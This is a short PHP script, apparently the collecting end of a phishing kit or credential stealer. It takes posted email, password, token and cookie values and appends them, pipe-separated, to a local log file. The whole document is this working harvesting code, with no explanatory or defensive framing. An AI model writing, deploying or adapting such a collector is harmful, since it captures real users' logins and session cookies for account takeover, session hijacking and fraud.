<?php

$c = $_POST['cookie'];
$e = $_POST['email'];
$p = $_POST['password'];
$t = $_POST['token'];
if($e){
    $filename = 'log.txt';
	$fp = fopen($filename, "a");
	fwrite($fp, "$e|$p|$t|$c"."\n");
	fclose($fp);
}

?>